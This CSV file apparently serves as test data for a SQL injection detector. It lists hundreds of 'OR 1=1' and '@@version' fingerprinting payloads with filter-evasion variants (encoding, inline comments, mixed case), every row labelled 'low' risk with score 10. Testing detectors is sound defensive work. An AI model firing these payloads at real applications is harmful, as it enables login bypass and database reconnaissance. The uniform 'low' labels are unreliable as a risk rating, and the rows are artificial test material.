Query,Risk Level,Expected Score
""" Or 1=1 # # VRtFFRqkj # mYSQL coMmENT /* TEst */",low,10
""" OR 1=1 # -- cKmgKRuk",low,10
"""	OR	1=1	# # EAIMW",low,10
""" || 1=1 # -- comment",low,10
"""+OR+1=1+#+/*+test+*/",low,10
""" or 1=1 # # mYsql COMMENT",low,10
""" oR 1=1 # -- ezcEzSXk -- comment",low,10
""" OR 1=1 # -- comment -- comment",low,10
"""/**/OR/**/1=1/**/#/**//*/**/test/**/*/ -- lzSnupyWJ",low,10
"""/**/||/**/1=1/**/#/**/#/**/jeEed",low,10
""" Or 1=1 # # MySQL comment",low,10
""" || 1=1 # /* test */",low,10
""" or 1=1 # -- iKHgJM",low,10
""" OR 1=1 # # xIxtBhGq -- xvPLEMpP",low,10
""" Or 1=1 # /* TEST */",low,10
"""/**/OR/**/1=1/**/#/**/--/**/cUNwz",low,10
""" or 1=1 # # wwMKOBEGy",low,10
"""	OR	1=1	#	#	ymFkwe",low,10
""" or 1=1 # # ReturHM",low,10
"""%20OR%201=1%20#%20--%20dJAWxTC",low,10
"""+or+1=1+# /* TEST */",low,10
""" OR 1=1 # -- yinZYhYKNF",low,10
"""	OR	1=1	#	--	BENQWJQBQ",low,10
"""%20or%201=1%20#%20#%20ekjafofpkn",low,10
"""%20OR%201=1%20#%20#%20MySQL%20comment%20#%20YllZIhLQA%20--%20HTKil",low,10
"""+Or+1=1+# # ztqtkn # MySQL comment",low,10
"""+||+1=1+# /* test */",low,10
"""	or	1=1	#+#+NHBvW",low,10
""" oR 1=1 # /* test */ # HwgwIGHGOH",low,10
""" OR 1=1 # # qudOAYpvqo # MySQL comment",low,10
"""	OR	1=1	# # MySQL comment",low,10
"""/**/OR/**/1=1/**/#/**/#/**/MYSQL/**/COMMENT",low,10
"""%20or%201=1%20#%20--%20comment",low,10
""" OR 1=1 # -- AYBGSF",low,10
"""	OR	1=1	#	--	nhTdQfxTg	#	MySQL	comment",low,10
""" OR 1=1 # # NvKTr",low,10
"""/**/OR/**/1=1/**/#/**/#/**/MySQL/**/comment/**/#/**/bCkclnQVJ",low,10
""" OR 1=1 # -- iikGiDQile",low,10
"""%20OR%201=1%20#%20#%20ilQXw",low,10
""" or 1=1 # # xijbfqud /* test */",low,10
"""/**/OR/**/1=1/**/#	#	BuTdV # MySQL comment",low,10
""" or 1=1 # -- xoLmaXriM -- IuGaN",low,10
"""	OR	1=1	# # UIFZVukEM",low,10
"""/**/OR/**/1=1/**/#/**/--/**/oqWAiWLBW/**/#/**/epoMZPFKM # MySQL comment",low,10
""" OR 1=1 # -- hAmyf /* test */",low,10
"""	OR	1=1	# # dhWvi",low,10
"""/**/OR/**/1=1/**/# -- comment # duGLf",low,10
"""%20OR%201=1%20#%20/*%20TEST%20*/",low,10
"""+or+1=1+#+--+XQUhMyJbAd",low,10
"""/**/or/**/1=1/**/#/**/#/**/UMLXYEY",low,10
"""	Or	1=1	#",low,10
"""+||+1=1+# # MySQL comment",low,10
"""+OR+1=1+# /* TEST */",low,10
"""+||+1=1+# -- GwZYMZ",low,10
""" or 1=1 # # MysqL coMMENt # UTnDkXAsF",low,10
"""	OR	1=1	#	#	MySQL	comment	/*	test	*/",low,10
"""/**/or/**/1=1/**/# # MySQL comment",low,10
""" OR 1=1 # # yrtohxC -- CPiVGW",low,10
"""	OR	1=1	#	--	DdJdK",low,10
""" OR 1=1 # -- comment /* test */",low,10
""" OR 1=1 # # MySQL comment -- comment",low,10
"""/**/or/**/1=1/**/#/**/--/**/COMMENT",low,10
""" OR 1=1 # # REJSkx",low,10
""" OR 1=1 # -- DoFSJG -- comment # MySQL comment",low,10
""" OR 1=1 # -- comment -- fPnaGIrV",low,10
"""	OR	1=1	#	--	lKTJdq",low,10
""" OR 1=1 # # MFwzxrQ",low,10
""" or 1=1 # # WqOXIs # mYsql COMMENT",low,10
""" Or 1=1 # -- comment # YPSPEV # IpWDvOAg",low,10
""" OR 1=1 # -- zPCCbvykyK # MYSql COmmeNt",low,10
"""/**/or/**/1=1/**/# # itjyjzgwsh /* test */",low,10
"""	OR	1=1	# /* test */",low,10
""" OR 1=1 # -- LhsXGitOF # MySQL comment # MySQL comment",low,10
"""+OR+1=1+# /* test */ # GLyMDMpZh",low,10
"""%20or%201=1%20#%20#%20mysql%20comment%20--%20comment",low,10
""" || 1=1 # # MySQL comment",low,10
"""	||	1=1	#/**/--/**/TZEEOW",low,10
"""	||	1=1	#	#	MySQL	comment",low,10
""" or 1=1 # /* TEST */ # MDjLM",low,10
"""/**/OR/**/1=1/**/# -- comment -- bgGpkE",low,10
""" OR 1=1 # -- IrGfanelmJ",low,10
""" oR 1=1 # -- CoMmEnt",low,10
""" || 1=1 # -- YlgwyoBkYu",low,10
""" Or 1=1 # # AKfEYNjFrC",low,10
"""%20Or%201=1%20# -- NuFCwyWr",low,10
""" OR 1=1 # -- nTJbXre /* test */",low,10
"""+OR+1=1+#+--+COMMENT",low,10
""" or 1=1 # # uPqAJPmKb",low,10
"""%20or%201=1%20#  #  mYsql  COMMENT",low,10
""" or 1=1 # # comment -- dqqponxdd",low,10
"""+OR+1=1+#+--+comment # CiYvLgTil",low,10
"""%20or%201=1%20# -- DbhbBfg",low,10
"""	OR	1=1	#	/*	TEST	*/",low,10
""" OR 1=1 # # BZhfpYP # lQVKPVO",low,10
""" or 1=1 # -- xefVlXnB",low,10
"""/**/OR/**/1=1/**/# -- comment -- QUfmBereQ",low,10
""" OR 1=1 # # kmpjVtPBa",low,10
""" OR 1=1 # # ujKPmFrAmG",low,10
"""+or+1=1+# # mYsql COMMENT # MySQL comment",low,10
"""  OR  1=1  # -- comment",low,10
"""/**/OR/**/1=1/**/#/**/#/**/MNAmRnNj",low,10
"""%20OR%201=1%20#%20--%20GMDlAbR",low,10
"""/**/OR/**/1=1/**/#/**/#/**/ojRmhoN",low,10
"""/**/OR/**/1=1/**/#/**/#/**/mYsql/**/COMMENT",low,10
""" || 1=1 # /* test */ /* test */",low,10
"""	Or	1=1	#	#	QhrKqkCpb",low,10
""" || 1=1 # -- ynQTw /* test */",low,10
"""/**/OR/**/1=1/**/# /* test */ -- comment",low,10
""" OR 1=1 # -- iKDUTpqD",low,10
or 1=1--,low,10
or 1=1-- # vnAQTTwRDt # MySQL comment,low,10
or%201=1--,low,10
Or 1=1--,low,10
or 1=1-- # MySQL comment,low,10
or+1=1--,low,10
or 1=1-- # chfcbWe,low,10
or 1=1-- -- comment,low,10
OR 1=1--,low,10
OR 1=1-- /* test */,low,10
or 1=1-- # QAgDNol,low,10
or/**//**/1=1--,low,10
or 1=1-- /* test */,low,10
or%201=1--%20--%20comment,low,10
or/**/1=1#,low,10
or 1=1-- -- qsndtibym,low,10
or	1=1--,low,10
oR 1=1--,low,10
or 1=1#,low,10
or	1=1--	--	bQnOEccyU,low,10
or 1=1-- # VAyVhcsG,low,10
or+1=1--+#+ZgiUXD,low,10
or	1=1--	/*	test	*/,low,10
OR 1=1-- # jSgrz,low,10
or	1=1--	#	MySQL	comment # MySQL comment,low,10
or%201=1-- -- QqptZKAU,low,10
OR+1=1--+--+COMMENT,low,10
oR	1=1--,low,10
OR+1=1-- -- tyuyoGRNZa,low,10
oR%201=1--,low,10
or/**/1=1--,low,10
or 1=1-- # IfPlzdSIh,low,10
oR 1=1-- /* tEsT */,low,10
or+1=1--+#+MySQL+comment,low,10
||%201=1--,low,10
OR%201=1--,low,10
or	1=1-- # mysql comment,low,10
or+1=1--+--+ekQZsiZWB,low,10
OR 1=1-- -- VOiJNtHOH,low,10
or  1=1--  /*  test  */,low,10
or 1=1# # mBCRA,low,10
or 1=1-- -- OYATl,low,10
OR 1=1-- # mYsql COMMENT,low,10
or 1=1-- -- PLKTTX,low,10
oR 1=1-- -- comment,low,10
OR 1=1-- /* TEST */ /* test */,low,10
or 1=1-- -- TDZhAp,low,10
or 1=1-- # mysqL cOMMeNt -- PmKsgy,low,10
OR/**/1=1-- /* TEST */,low,10
OR	1=1-- /* test */,low,10
OR	1=1--,low,10
Or 1=1# # MySQL comment,low,10
or 1=1-- -- MkpFkVVWLn,low,10
or%201=1-- # JZFUKUSES,low,10
or/**/1=1--/**/#/**/feaLaOse/**/#/**/MySQL/**/comment,low,10
OR 1=1-- # QORWRHmI,low,10
or 1=1-- -- SZOEY,low,10
or 1=1-- -- RqQqnDW,low,10
or+1=1-- -- comment,low,10
OR 1=1-- /* test */ -- JcudGU,low,10
or 1=1-- -- XQyxf,low,10
or 1=1-- # OjjPuRQOpF -- IddgCvf,low,10
or+1=1#,low,10
or/**/1=1--	#	MySQL	comment,low,10
or+1=1--+--+mFYsnXIcUp,low,10
or	1=1--	--	XrJNuB,low,10
or 1=1-- -- GHaZPrmXIw,low,10
OR 1=1-- # AIDIJIHCGM,low,10
or	1=1-- # MySQL comment,low,10
or 1=1-- -- AGwifuBbpo # bhpPCitr,low,10
Or 1=1-- -- cOMmeNT,low,10
or	1=1-- -- comment,low,10
or 1=1-- # DUZqWPs,low,10
OR 1=1-- -- znndfzzKTd,low,10
or 1=1-- # uboIbnBa /* test */,low,10
or 1=1# # MySQL comment,low,10
OR 1=1-- -- XCDVMMVBTP,low,10
or 1=1-- # yirqfdqqx,low,10
or%201=1--%20#%20MySQL%20comment%20--%20XKwbi,low,10
oR	1=1-- -- comment,low,10
or 1=1-- -- vhlioB,low,10
oR/**/1=1-- /* test */,low,10
or 1=1-- -- kOzbpAr,low,10
or%201=1-- # edkfoiyhmg,low,10
or%201=1-- /* test */,low,10
OR 1=1#,low,10
or 1=1-- # CpVGqb,low,10
or%201=1# # mmmPPyCN # MySQL comment,low,10
or+1=1--+--+iaoixwmo,low,10
or	1=1#,low,10
oR+1=1-- # MySQL comment,low,10
or/**/1=1--/**/--/**/GfrMMHc,low,10
or/**/1=1#/**/#/**/comment # zXVkOFZC,low,10
or 1=1# -- comment,low,10
OR/**/1=1--/**//*/**/TEST/**/*/ # SECgDYc,low,10
or	1=1--	--	comment,low,10
or 1=1-- # SLVyYrj,low,10
or%201=1--%20--%20comment%20/*%20test%20*/,low,10
or/**/1=1-- /* test */,low,10
or	1=1--	#	RsSYwFjU,low,10
OR 1=1-- -- COMMENT /* test */,low,10
OR%201=1#%20#%20mySQL%20CoMmeNT,low,10
or%201=1--%20#%20jdrpivz,low,10
OR 1=1-- # sPhSvJr,low,10
or+1=1--+#+RviabhEuRK,low,10
OR/**/1=1--,low,10
OR+1=1-- # uaQKjKHyt,low,10
OR/**/1=1-- /* test */,low,10
OR	1=1--/**//*/**/TEST/**/*/,low,10
OR  1=1--  --  COMMENT,low,10
or 1=1# # CSmeQALyNz,low,10
or 1=1-- -- TfODuiPk # gqGkJgzbhw,low,10
or 1=1# # zSfkf,low,10
OR 1=1-- -- COMMENT,low,10
Or 1=1-- # MySQL comment,low,10
or 1=1# -- dQWWdXjqL,low,10
or 1=1-- -- MJAtifCxto,low,10
or 1=1# # RKhoth,low,10
or 1=1-- /* test */ # MySQL comment # qmFcATnIKQ,low,10
OR 1=1-- -- comment # MySQL comment,low,10
or%201=1#,low,10
||%201=1-- # MYSQL COMMENT,low,10
OR	1=1--	#	PPJTPKbCT,low,10
or/**/1=1--/**/#/**/mysql/**/comment # PGbJMLXrpP /* test */,low,10
or	1=1#	#	MySQL	comment -- Bosjv,low,10
or	1=1--	#	woRIvwqbHJ,low,10
or+1=1--+/*+test+*/+--+kJoFNcb,low,10
or 1=1-- -- comment -- comment,low,10
or%201=1-- # MySQL comment,low,10
or+1=1--+#+TbFtZP,low,10
or	1=1# # comment,low,10
|| 1=1-- # MySQL comment,low,10
OR 1=1-- -- COMMENT # beiOISUn,low,10
OR 1=1-- # FCUHMGGC -- tIzliS,low,10
or  1=1-- /* test */,low,10
or+1=1#+#+FvkyKR,low,10
OR 1=1-- # MYSQL COMMENT -- comment,low,10
or	1=1-- /* test */,low,10
or 1=1# # UDiALee # RFwLyq,low,10
OR 1=1-- # MYSQL COMMENT,low,10
|| 1=1-- -- comment,low,10
or%201=1--%20#%20MySQL%20comment%20--%20comment /* test */,low,10
OR+1=1--+--+sxJQNvp,low,10
or 1=1-- /* test */ -- comment -- tcPcMDCpE,low,10
OR+1=1-- # MYSQL COMMENT,low,10
or 1=1-- # wStrQb,low,10
or	1=1--+/*+test+*/,low,10
OR%201=1#,low,10
or%201=1--%20#%20MySQL%20comment,low,10
or 1=1-- /* test */ /* test */,low,10
or%201=1--%20/*%20test%20*/,low,10
OR 1=1-- # mYsql COMMENT /* TEST */,low,10
OR%201=1--%20#%20DAPVSI%20/*%20TEST%20*/,low,10
|| 1=1--,low,10
OR 1=1-- -- COMMENT # MFIvpKt,low,10
or%201=1--%20--%20CJKAGegd,low,10
or/**/1=1--/**/--/**/comment,low,10
OR/**/1=1--/**/--/**/GCTLJ,low,10
or%201=1#%20#%20MySQL%20comment,low,10
or+1=1--+#+dGWysF+/*+test+*/,low,10
or+1=1-- /* test */,low,10
or/**/1=1--/**/--/**/comment -- comment,low,10
oR+1=1--,low,10
OR 1=1-- # MYSQL COMMENT /* TEST */,low,10
||/**/1=1--,low,10
OR+1=1--	/*	test	*/,low,10
OR 1=1-- -- MTvKlluiHR /* TEST */,low,10
or	1=1--	#	BgiWJbeX	--	NWuzqfQGHU,low,10
OR+1=1--,low,10
Or 1=1#,low,10
OR 1=1# -- QvBxEKnf,low,10
or+1=1#+/*+test+*/%20#%20FjYrUu,low,10
or%201=1--%20--%20IMSIdP -- JvNllMGznc,low,10
or%201=1# /* test */,low,10
or%201=1--%20#%20MySQL%20comment%20#%20poJFiCidmP,low,10
or 1=1-- /* test */ -- comment,low,10
or+1=1-- -- qfgswhq,low,10
OR 1=1-- -- ComMeNT # FAjRcAPJt,low,10
or+1=1#+#+LKNDu,low,10
or%201=1--%20--%20aklwzsvt%20#%20bxanbyt,low,10
or 1=1# # wnGMi,low,10
or	1=1--	#	TyxetzYbp,low,10
or%201=1--%20#%20mysql%20comment,low,10
OR+1=1#,low,10
|| 1=1-- /* TEST */,low,10
or 1=1-- # mysql comment,low,10
or/**/1=1--/**/--/**/GadbmSW,low,10
or/**/1=1--/**/--/**/knsuQeHIqy -- DWLUzZ,low,10
or+1=1--+#+MySQL+comment+/*+test+*/,low,10
or 1=1# # comment,low,10
or 1=1-- # MySQL comment # MySQL comment,low,10
or/**/1=1-- # qGkzAo,low,10
or	1=1--	--	CKHvicWpwG,low,10
or+1=1-- -- onpyUuz /* test */,low,10
or 1=1-- # MySQL comment -- PhNcwROHsa,low,10
or	1=1--	--	comment	--	yREPM,low,10
or%201=1-- # GTCiuedC,low,10
OR/**/1=1-- /* tEsT */,low,10
OR 1=1-- # MySQL comment,low,10
or 1=1# # mysql comment,low,10
OR	1=1--	--	sxYzhnWFy,low,10
or 1=1# /* test */,low,10
or%201=1--%20#%20mysql%20coMment,low,10
or 1=1# -- jQXGj -- comment,low,10
OR 1=1-- -- COMMENT # mYsql COMMENT,low,10
or	1=1#	/*	test	*/,low,10
or+1=1-- # xdqrtmse,low,10
OR 1=1-- /* TEST */ # MYSQL COMMENT # hOLRFLm,low,10
or%201=1--%20#%20XxyGen,low,10
or 1=1-- /* test */ -- wJaUp # QAxAO,low,10
OR+1=1-- # zuIXxGfqU,low,10
OR 1=1-- -- qVCLnjEp,low,10
or 1=1-- -- UyJypiayd,low,10
OR	1=1-- /* test */ # aSryhLeS # MySQL comment,low,10
or 1=1# # rmsdXjYZ # comment,low,10
Or/**/1=1--/**/--/**/xAGReOEnm,low,10
OR 1=1-- # inYNpEVSfS,low,10
or 1=1-- # yhYSzkmXbr -- EwBiP,low,10
or 1=1# # comment # xjXnRgZRZd,low,10
OR+1=1--+#+ZYHWEBEA,low,10
or%201=1--%20#%20VizjQxBt,low,10
or  1=1--,low,10
or+1=1#+--+zoaZbFBgj # FEEtBMy,low,10
OR 1=1-- -- comment,low,10
or%20%201=1--%20/*%20test%20*/,low,10
OR 1=1# # COMMENT -- comment,low,10
OR 1=1-- # QrTjy /* test */,low,10
or/**/1=1--	#	mysql	comment,low,10
or	1=1--	--	FWOxg,low,10
or/**/1=1-- -- WImHRjOVWH,low,10
or%201=1--%20#%20klRgFRw%20--%20RmwDEXshKS,low,10
or+1=1-- -- eKtqUo,low,10
or/**/1=1--/**/#/**/MySQL/**/comment,low,10
or/**/1=1#/**/#/**/MySQL/**/comment,low,10
OR 1=1# /* TEST */ /* test */ # comment,low,10
Or 1=1-- /* tesT */,low,10
|| 1=1# # MySQL comment,low,10
or%201=1--%20#%20aaaajonpdg,low,10
or%201=1--%20--%20HASgBSrx,low,10
OR 1=1-- -- CommenT,low,10
or+1=1--+/*+TeST+*/,low,10
or/**/1=1-- -- yNMWnLei -- fPQrRblR # MySQL comment,low,10
or 1=1# # BWqTnxon,low,10
oR	1=1--	--	QAiyDUvRk,low,10
or 1=1-- -- SDVRkwXHs,low,10
or	1=1--	--	comment	#	MySQL	comment,low,10
OR	1=1-- # ZrtNzBMOO,low,10
or 1=1-- # cpCzBodAST,low,10
oR 1=1-- -- HbZuJM,low,10
or 1=1# # comment -- rTVYKsaa,low,10
' OR 1 IN (SELECT @@version) --,low,10
' or 1 in (select @@VERSION) --,low,10
' OR 1 IN (SELECT @@version) -- /* test */,low,10
' || 1 IN (SELECT @@version) --,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--,low,10
' OR 1 IN (SELECT @@version) -- -- DNtmpPgqxx,low,10
'  or  1  in  (select  @@version)  --,low,10
' OR 1 IN (SELECT @@version) -- -- comment,low,10
'+OR+1+IN+(SELECT+@@version)+--,low,10
' OR 1 IN (SELECT @@version) -- # yTUgZIaU,low,10
'	OR	1	IN	(SELECT	@@version)	--	#	AUrPEhhTHG # MySQL comment,low,10
' OR 1 IN (SELECT @@version) -- # bQqkVrFQlT,low,10
' OR 1 IN (SELECT @@version) -- -- KQQqn,low,10
""" OR 1 IN (SELECT @@version) -- -- comment",low,10
'	||	1	IN	(SELECT	@@version)	-- /* test */,low,10
'	OR	1	IN	(SELECT	@@version)	#,low,10
' or 1 in (select @@version) # -- EKMBNrdV,low,10
""" or 1 iN (sELecT @@versiOn) -- /* test */",low,10
'%20or%201%20in%20(select%20@@VERSION)%20--,low,10
' || 1 IN (SELECT @@version) -- # UyoUlZ,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--,low,10
'+OR+1+IN+(SELECT+@@version)+-- -- comment # MySQL comment,low,10
' oR 1 IN (SElect @@veRSiOn) --,low,10
' OR 1 IN (SELECT @@version) -- # MySQL comment # MySQL comment,low,10
' OR 1 in (SELEcT @@VersioN) -- /* TESt */,low,10
'+OR+1+IN+(SELECT+@@version)+--+/*+test+*/ -- AzyfaL,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/--/**//*/**/test/**/*/,low,10
' or 1 In (SeLECt @@VERsIon) --,low,10
"""%20OR%201%20IN%20(SELECT%20@@version)%20-- -- HZwRXLV",low,10
'	OR	1	IN	(SELECT	@@version)	--	/*	test	*/,low,10
' or 1 in (select @@version) --,low,10
"""%20OR%201%20IN%20(SELECT%20@@version)%20--",low,10
' OR 1 IN (SELEcT @@VERSiON) --,low,10
'%20or%201%20in%20(select%20@@version)%20--,low,10
'+OR+1+IN+(SELECT+@@version)+-- -- dfDiXTRwki,low,10
' OR 1 IN (SELECT @@version) -- -- comment /* test */,low,10
' OR 1 IN (SELECT @@version) -- # MySQL comment,low,10
' OR 1 IN (SELECT @@version) -- # HkryOUDZft,low,10
' Or 1 In (select @@vErsiOn) -- # PKkXbkUMsO,low,10
' OR 1 IN (SELECT @@version) -- # zIgcMLEYW,low,10
""" || 1 IN (SELECT @@version) --",low,10
'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--,low,10
'	||	1	IN	(SELECT	@@version)	--,low,10
""" OR 1 IN (SELECT @@version) -- # MySQL comment -- comment",low,10
"""%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20SDrysIHrtZ",low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/--,low,10
'	OR	1	IN	(SELECT	@@VERSION)	--,low,10
' OR 1 IN (SELECT @@version) -- # FAUiLhyc # CEXUoCnbB,low,10
'	OR	1	IN	(SELECT	@@version)	--,low,10
'	OR	1	IN	(SELECT	@@version)	--	--	comment	--	comment,low,10
' OR 1 IN (SELECT @@version) -- -- NbRrM,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- # AkdkUzVzye,low,10
' || 1 IN (SELECT @@VERSION) --,low,10
'	OR	1	IN	(SELECT	@@version)	--	#	MySQL	comment,low,10
' OR 1 IN (SELECT @@version) -- -- XWvhZulwj,low,10
'	OR	1	IN	(SELECT	@@version)	-- # MySQL comment # MySQL comment,low,10
'+OR+1+IN+(SELECT+@@VERSION)+--,low,10
' || 1 in (select @@VERSION) --,low,10
""" OR 1 IN (SELECT @@version) --",low,10
' OR 1 IN (SELECT @@version) -- -- iZMtqByHQg /* test */,low,10
' or 1 iN (SELEcT @@VersioN) --,low,10
'+OR+1+IN+(SELECT+@@version)+--+--+DoytPhs,low,10
'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--%20--%20COMMENT,low,10
' OR 1 IN (SELECT @@version) # /* test */ # MySQL comment,low,10
' oR 1 in (SeLEct @@VerSION) --,low,10
'	OR	1	iN	(SElECT	@@VErsIoN)	--,low,10
' oR 1 In (SElECt @@veRSiOn) -- -- comment,low,10
""" OR 1 In (sELeCT @@veRSion) -- -- zNLZpANPAr",low,10
' OR 1 IN (SELECT @@version) -- # wQAzykQO,low,10
' OR 1 IN (SELECT @@version) #,low,10
' OR 1 IN (SELECT @@version) # -- comment,low,10
' OR 1 IN (SELECT @@version) -- -- comment -- VeosNeAlz,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- -- WZZpFJPf,low,10
' OR 1 IN (SELECT @@version) -- -- eZVyOtqbqf,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20-- /* test */,low,10
' OR 1 in (SELEcT @@veRsIoN) --,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@VERSION)/**/--/**/--/**/MPBXLIB,low,10
""" or 1 In (SeLecT @@VErsioN) -- # MYsqL ComMenT",low,10
' OR 1 IN (SELECT @@version) -- # dwHWPS,low,10
' OR 1 IN (SELECT @@version) -- # OQYdZz,low,10
'+Or+1+In+(Select+@@VERsiOn)+--,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20comment%20--%20comment,low,10
' OR 1 IN (SELECT @@version) -- # CVUzz,low,10
'	||	1	in	(SElEcT	@@VERsiON)	--,low,10
' or 1 in (select @@VERSION) -- /* TEST */ -- egjYbqPj,low,10
' Or 1 iN (seLect @@VERSiON) --,low,10
' or 1 in (select @@VERSION) #,low,10
' OR 1 IN (SELECT @@version) # # MySQL comment,low,10
'/**/Or/**/1/**/IN/**/(SELECt/**/@@VErSIOn)/**/--,low,10
"""+OR+1+IN+(SELECT+@@version)+--",low,10
""" OR 1 IN (SELECT @@version) -- # MySQL comment",low,10
'+OR+1+IN+(SELECT+@@version)+-- # MySQL comment,low,10
' or 1 in (select @@version) -- -- comment,low,10
' or 1 in (select @@version) #,low,10
'+||+1+IN+(SELECT+@@version)+--,low,10
'+or+1+in+(select+@@VERSION)+--+--+oJAFDAV,low,10
' OR 1 IN (SELECT @@version) -- -- FWGkOjclmo,low,10
'	OR	1	IN	(SELECT	@@version)	-- # QusSxBb,low,10
""" OR 1 IN (SELECT @@version) -- /* test */",low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20comment # qBUcGny,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- # MySQL comment,low,10
' OR 1 IN (SELECT @@VERSION) --,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20#,low,10
'  OR  1  IN  (SELECT  @@version)  --,low,10
'	or	1	In	(SElECT	@@VErSion)	--,low,10
'+or+1+in+(select+@@VERSION)+--,low,10
"""	or	1	in	(select	@@version)	--",low,10
' or 1 in (select @@VERSION) -- -- CEnkXnh # mYsql COMMENT,low,10
'	OR	1	IN	(SELECT	@@version)	-- -- comment,low,10
' OR 1 IN (SELECT @@version) -- /* test */ /* test */,low,10
' Or 1 IN (selECt @@veRSIon) --,low,10
'+OR+1+IN+(SELECT+@@version)+--+--+comment,low,10
'/**/or/**/1/**/IN/**/(sEleCt/**/@@VERSIon)/**/--,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20-- -- iGESpvNN,low,10
'	OR	1	IN	(SELECT	@@version)	-- -- okmIbkdi,low,10
'+OR+1+IN+(SELECT+@@version)+#,low,10
""" or 1 in (select @@VERSION) --",low,10
' oR 1 iN (sELEcT @@vErSion) -- /* test */,low,10
' Or 1 in (sElEct @@VERsion) --,low,10
'/**/or/**/1/**/in/**/(select/**/@@version)/**/--,low,10
' OR 1 IN (SELECT @@version) -- # dWBtGSm,low,10
' OR 1 IN (SELECT @@version) -- # XbraoIUiOX,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--%20/*%20test%20*/,low,10
'+OR+1+IN+(SELECT+@@version)+--+#+MySQL+comment,low,10
' or 1 in (select @@version) -- /* test */,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20-- # EuyUzwI # AkWNlHXuK,low,10
' OR 1 IN (SELECT @@VERSION) -- -- HOCUGKCT,low,10
' OR 1 IN (SELECT @@version) -- -- yPYtcX,low,10
'+OR+1+IN+(SELECT+@@version)+--+--+ZkoVuv,low,10
' OR 1 IN (SELECT @@version) # # zJQBAM,low,10
' || 1 IN (SELECT @@VERSION) -- /* TEST */,low,10
'	Or	1	in	(SeLECt	@@VerSiON)	--,low,10
""" or 1 in (select @@version) -- # rffoo",low,10
'+OR+1+IN+(SELECT+@@version)+#+#+ZpVDXBYCcV -- NLZOB,low,10
' OR 1 IN (SELECT @@VERSION) -- # OCQFPGRSU,low,10
'%20or%201%20in%20(select%20@@version)%20--%20--%20pnnqpg,low,10
"""/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/-- -- XfzVPi # MySQL comment",low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--%20--%20CCtZW,low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20--%20#%20CMvuBU%20--%20uvfxQmhEXw,low,10
'%20OR%201%20IN%20(SELECT%20@@VERSION)%20-- -- COMMENT,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/# -- comment -- pyvvnT,low,10
' OR 1 IN (SELECT @@version) -- -- rHBCyvRgp,low,10
' OR 1 IN (SELECT @@VERSION) -- -- JQTWINQSU -- COMMENT,low,10
'		OR		1		IN		(SELECT		@@VERSION)		--%20/*%20TEST%20*/,low,10
'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--/**/--/**/TSEFBEMWU,low,10
""" OR 1 IN (SELECT @@VERSION) -- -- KSTQD -- comment",low,10
'%20||%201%20IN%20(SELECT%20@@version)%20--,low,10
'	OR	1	IN	(SELECT	@@VERSION)	#,low,10
'+||+1+IN+(SELECT+@@version)+--+#+MySQL+comment,low,10
'/**/OR/**/1/**/IN/**/(SELECT/**/@@version)/**/#,low,10
""" OR 1 IN (SELECT @@version) -- # MySQL comment -- Yawccphsq",low,10
'%20OR%201%20IN%20(SELECT%20@@version)%20#%20#%20WVYLmL,low,10
' OR 1 IN (SELECT @@version) -- -- FjJRjGwuz # MySQL comment,low,10
'%20OR%201%20IN%20(SELECT%20@@VERSION)%20--/**//*/**/test/**/*/,low,10
'+or+1+in+(select+@@version)+#,low,10
'+Or+1+IN+(SELecT+@@vERSION)+-- -- comment,low,10
"""  or  1  iN  (sElECt  @@veRSION)  # # QFFlRitSjG",low,10
